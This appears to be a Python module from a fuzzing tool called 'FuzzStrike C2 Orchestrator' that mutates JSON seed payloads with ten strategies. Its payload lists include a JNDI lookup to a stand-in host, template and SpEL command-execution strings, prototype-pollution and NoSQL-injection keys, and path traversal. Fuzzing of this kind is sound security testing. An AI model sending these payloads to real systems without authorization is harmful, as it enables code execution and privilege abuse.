# ============================================================================
# FuzzStrike C2 Orchestrator — Payload Mutation Engine
# ============================================================================
# Implements a generation-based fuzzer that takes a JSON seed payload and
# produces N mutated variants using a portfolio of mutation strategies.
#
# Mutation Strategies (each implements a different class of input fault):
#
#   1. BIT_FLIP        — Flip random bits in string values
#   2. BOUNDARY_VALUE  — Replace integers with boundary values (0, -1, MAX_INT)
#   3. STRING_OVERFLOW — Replace strings with massive repeated characters
#   4. TYPE_CONFUSION  — Swap data types (int→string, string→bool, etc.)
#   5. KEY_INJECTION   — Inject unexpected keys with adversarial values
#   6. NULL_INJECTION  — Replace random values with null/None
#   7. FORMAT_STRING   — Inject format string attack patterns
#   8. UNICODE_STRESS  — Inject Unicode edge cases (RTL, zero-width, etc.)
#   9. DEEP_NESTING    — Create deeply nested recursive structures
#  10. ARRAY_BOMB      — Replace values with massive arrays
#
# Design Philosophy:
#   Each strategy is a pure function: seed_dict → mutated_dict.
#   The engine randomly selects strategies and applies them, producing
#   a diverse corpus of malformed inputs per campaign.
# ============================================================================

import copy
import json
import os
import random
import string
from typing import Any

from loguru import logger


# ============================================================================
# Strategy Registry — Maps strategy names to their implementation functions
# ============================================================================

_STRATEGY_REGISTRY: dict[str, callable] = {}


def _register_strategy(name: str):
    """Decorator to register a mutation strategy function."""
    def decorator(func):
        _STRATEGY_REGISTRY[name] = func
        return func
    return decorator


# ============================================================================
# Mutation Strategies
# ============================================================================

@_register_strategy("BIT_FLIP")
def _mutate_bit_flip(seed: dict) -> dict:
    """
    Flip random bits in string values.

    This simulates data corruption during transmission. Effective at
    finding parsers that assume UTF-8 validity without checking.
    """
    mutated = copy.deepcopy(seed)
    str_keys = [k for k, v in mutated.items() if isinstance(v, str) and len(v) > 0]

    if not str_keys:
        return mutated

    key = random.choice(str_keys)
    value = mutated[key]

    # Convert to bytearray, flip 1-3 random bits, convert back
    byte_arr = bytearray(value.encode("utf-8", errors="replace"))
    num_flips = random.randint(1, min(3, len(byte_arr)))

    for _ in range(num_flips):
        idx = random.randint(0, len(byte_arr) - 1)
        bit_pos = random.randint(0, 7)
        byte_arr[idx] ^= (1 << bit_pos)

    mutated[key] = byte_arr.decode("utf-8", errors="replace")
    return mutated


@_register_strategy("BOUNDARY_VALUE")
def _mutate_boundary_value(seed: dict) -> dict:
    """
    Replace integer values with boundary/edge-case values.

    Tests for integer overflow, underflow, and off-by-one errors.
    These values are specifically chosen to trigger common C/Java
    integer boundary bugs.
    """
    BOUNDARY_VALUES = [
        0, -1, 1,
        127, 128, 255, 256,             # Byte boundaries
        32767, 32768, 65535, 65536,      # Short boundaries
        2147483647, 2147483648,          # Int32 boundaries
        -2147483648, -2147483649,
        9999999999999,                    # Large number
        -9999999999999,
    ]

    mutated = copy.deepcopy(seed)
    int_keys = [k for k, v in mutated.items() if isinstance(v, (int, float))]

    if not int_keys:
        # If no int keys, inject a boundary value into a random key
        key = random.choice(list(mutated.keys())) if mutated else None
        if key:
            mutated[key] = random.choice(BOUNDARY_VALUES)
        return mutated

    key = random.choice(int_keys)
    mutated[key] = random.choice(BOUNDARY_VALUES)
    return mutated


@_register_strategy("STRING_OVERFLOW")
def _mutate_string_overflow(seed: dict) -> dict:
    """
    Replace string values with extremely long strings.

    Targets buffer overflow vulnerabilities and memory allocation
    bugs. The payload size is randomized to find exact thresholds.
    """
    OVERFLOW_PATTERNS = [
        "A" * random.randint(1000, 50000),           # Simple repeat
        "A" * 1048577,                                 # Just over 1MB (trigger target crash)
        "\x00" * random.randint(100, 10000),          # Null bytes
        "../" * random.randint(100, 1000),            # Path traversal
        "%s" * random.randint(100, 1000),             # Format string
        "{{" * random.randint(100, 1000) + "}}",     # Template injection
    ]

    mutated = copy.deepcopy(seed)
    str_keys = [k for k, v in mutated.items() if isinstance(v, str)]

    if not str_keys:
        key = random.choice(list(mutated.keys())) if mutated else None
        if key:
            mutated[key] = random.choice(OVERFLOW_PATTERNS)
        return mutated

    key = random.choice(str_keys)
    mutated[key] = random.choice(OVERFLOW_PATTERNS)
    return mutated


@_register_strategy("TYPE_CONFUSION")
def _mutate_type_confusion(seed: dict) -> dict:
    """
    Swap data types to unexpected alternatives.

    Tests for type coercion bugs, missing type checks, and
    deserialization vulnerabilities. E.g., replacing an int with
    a string, or a string with a nested object.
    """
    TYPE_SWAPS = {
        str: [42, True, None, [], {}, 3.14, -1],
        int: ["string_value", True, None, "99999", [], 1.5],
        float: ["NaN", "Infinity", None, True, 0, "3.14"],
        bool: [0, 1, "true", "false", None, "yes", ""],
        type(None): ["", 0, False, [], "null", "undefined"],
    }

    mutated = copy.deepcopy(seed)
    if not mutated:
        return mutated

    key = random.choice(list(mutated.keys()))
    value = mutated[key]
    value_type = type(value)

    if value_type in TYPE_SWAPS:
        mutated[key] = random.choice(TYPE_SWAPS[value_type])
    else:
        mutated[key] = None

    return mutated


@_register_strategy("KEY_INJECTION")
def _mutate_key_injection(seed: dict) -> dict:
    """
    Inject unexpected keys with adversarial values.

    Tests for mass assignment vulnerabilities, prototype pollution,
    and missing input sanitization on unknown fields.
    """
    INJECTED_KEYS = {
        "__proto__": {"isAdmin": True},
        "constructor": {"prototype": {"isAdmin": True}},
        "$where": "function() { return true; }",
        "admin": True,
        "role": "superadmin",
        "__class__": "os.system('id')",
        "_id": {"$gt": ""},
        "is_staff": True,
        "$ne": None,
        "debug": True,
        "__import__": "os",
    }

    mutated = copy.deepcopy(seed)

    # Inject 1-3 random adversarial keys
    num_injections = random.randint(1, 3)
    injection_keys = random.sample(
        list(INJECTED_KEYS.keys()),
        min(num_injections, len(INJECTED_KEYS))
    )

    for k in injection_keys:
        mutated[k] = INJECTED_KEYS[k]

    return mutated


@_register_strategy("NULL_INJECTION")
def _mutate_null_injection(seed: dict) -> dict:
    """
    Replace random values with null/None.

    Tests for null pointer dereferences and missing null checks
    in the target application.
    """
    mutated = copy.deepcopy(seed)
    if not mutated:
        return mutated

    # Null out 1 to all keys
    keys_to_null = random.sample(
        list(mutated.keys()),
        random.randint(1, len(mutated))
    )

    for key in keys_to_null:
        mutated[key] = None

    return mutated


@_register_strategy("FORMAT_STRING")
def _mutate_format_string(seed: dict) -> dict:
    """
    Inject format string attack patterns.

    Targets C-style printf vulnerabilities and template engines
    that blindly interpolate user input.
    """
    FORMAT_PATTERNS = [
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n",
        "${7*7}",
        "{{7*7}}",
        "#{7*7}",
        "${jndi:ldap://evil.com/a}",
        "{{constructor.constructor('return this')()}}",
        "%p%p%p%p%p%p%p%p",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ]

    mutated = copy.deepcopy(seed)
    str_keys = [k for k, v in mutated.items() if isinstance(v, str)]

    if not str_keys:
        key = random.choice(list(mutated.keys())) if mutated else None
        if key:
            mutated[key] = random.choice(FORMAT_PATTERNS)
        return mutated

    key = random.choice(str_keys)
    mutated[key] = random.choice(FORMAT_PATTERNS)
    return mutated


@_register_strategy("UNICODE_STRESS")
def _mutate_unicode_stress(seed: dict) -> dict:
    """
    Inject Unicode edge cases that commonly break parsers.

    Includes right-to-left overrides, zero-width characters,
    emoji sequences, and BOM markers.
    """
    UNICODE_PAYLOADS = [
        "\u202e\u0041\u0042\u0043",      # Right-to-left override
        "\u200b" * 100,                    # Zero-width spaces
        "\ufeff" + "admin",               # BOM + content
        "A\u0300" * 100,                   # Combining diacritical marks
        "\ud800",                          # Lone high surrogate (invalid)
        "\U0001F4A9" * 50,                # Pile of poo emoji × 50
        "admin\x00root",                   # Null byte injection in string
        "\t\n\r" * 100,                    # Control characters
        "\u2028\u2029" * 50,              # Line/paragraph separators
        "‪‫‬‭‮" * 20,                      # Bidirectional control chars
    ]

    mutated = copy.deepcopy(seed)
    str_keys = [k for k, v in mutated.items() if isinstance(v, str)]

    if not str_keys:
        key = random.choice(list(mutated.keys())) if mutated else None
        if key:
            mutated[key] = random.choice(UNICODE_PAYLOADS)
        return mutated

    key = random.choice(str_keys)
    mutated[key] = random.choice(UNICODE_PAYLOADS)
    return mutated


@_register_strategy("DEEP_NESTING")
def _mutate_deep_nesting(seed: dict) -> dict:
    """
    Create deeply nested recursive structures.

    Targets stack overflow bugs in recursive JSON parsers and
    deserialization libraries.
    """
    mutated = copy.deepcopy(seed)
    if not mutated:
        return mutated

    # Build a deeply nested structure
    depth = random.randint(50, 500)
    nested = {"value": "deep_payload"}

    for i in range(depth):
        nested = {"nested": nested}

    key = random.choice(list(mutated.keys()))
    mutated[key] = nested
    return mutated


@_register_strategy("ARRAY_BOMB")
def _mutate_array_bomb(seed: dict) -> dict:
    """
    Replace values with massive arrays.

    Tests for quadratic blowup in JSON parsing, memory exhaustion,
    and missing input size validation.
    """
    mutated = copy.deepcopy(seed)
    if not mutated:
        return mutated

    key = random.choice(list(mutated.keys()))

    # Choose between different array bomb patterns
    bomb_type = random.randint(0, 2)

    if bomb_type == 0:
        # Large flat array of identical elements
        mutated[key] = [0] * random.randint(10000, 100000)
    elif bomb_type == 1:
        # Array of mixed types
        mutated[key] = [
            random.choice([0, "A", True, None, 1.5])
            for _ in range(random.randint(1000, 10000))
        ]
    else:
        # Nested arrays (exponential expansion potential)
        inner = list(range(100))
        mutated[key] = [inner] * random.randint(100, 1000)

    return mutated


# ============================================================================
# Public API — Mutation Engine
# ============================================================================

def get_available_strategies() -> list[str]:
    """
    Return the list of registered mutation strategy names.

    Returns:
        list[str]: Strategy names that can be used for mutation.
    """
    return list(_STRATEGY_REGISTRY.keys())


def mutate_seed(seed_json: str, count: int = 50) -> list[dict]:
    """
    Generate mutated payloads from a JSON seed string.

    The engine randomly selects mutation strategies from the registry
    and applies them to produce a diverse corpus of malformed inputs.
    Each payload is tagged with the strategy that generated it.

    Args:
        seed_json: The original payload as a JSON string.
        count: Number of mutated payloads to generate.

    Returns:
        list[dict]: Each dict contains:
            - "content": The mutated payload as a JSON string
            - "mutation_type": The strategy name used
            - "size_bytes": The byte size of the mutated JSON

    Raises:
        ValueError: If seed_json is not valid JSON.
    """
    # Parse the seed — fail fast if it's not valid JSON
    try:
        seed_dict = json.loads(seed_json)
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON seed payload: {e}")

    if not isinstance(seed_dict, dict):
        raise ValueError("Seed payload must be a JSON object (dict), not a scalar or array")

    strategies = list(_STRATEGY_REGISTRY.keys())
    results = []

    logger.info(
        f"Mutation engine starting: generating {count} payloads "
        f"from seed with {len(seed_dict)} keys using {len(strategies)} strategies"
    )

    for i in range(count):
        # Randomly select a strategy
        strategy_name = random.choice(strategies)
        strategy_fn = _STRATEGY_REGISTRY[strategy_name]

        try:
            # Apply the mutation
            mutated_dict = strategy_fn(seed_dict)

            # Serialize back to JSON
            mutated_json = json.dumps(mutated_dict, ensure_ascii=False, default=str)

            results.append({
                "content": mutated_json,
                "mutation_type": strategy_name,
                "size_bytes": len(mutated_json.encode("utf-8")),
            })

        except Exception as e:
            # If a strategy fails, log it but don't halt the entire run.
            # Robust fuzzing must tolerate individual mutation failures.
            logger.warning(
                f"Strategy '{strategy_name}' failed on iteration {i}: {e}"
            )

            # Generate a fallback: the raw seed with a marker
            fallback = copy.deepcopy(seed_dict)
            fallback["__fuzzstrike_error__"] = str(e)
            fallback_json = json.dumps(fallback, ensure_ascii=False, default=str)

            results.append({
                "content": fallback_json,
                "mutation_type": f"{strategy_name}_FALLBACK",
                "size_bytes": len(fallback_json.encode("utf-8")),
            })

    logger.info(
        f"Mutation engine complete: generated {len(results)} payloads, "
        f"total size: {sum(r['size_bytes'] for r in results):,} bytes"
    )

    return results
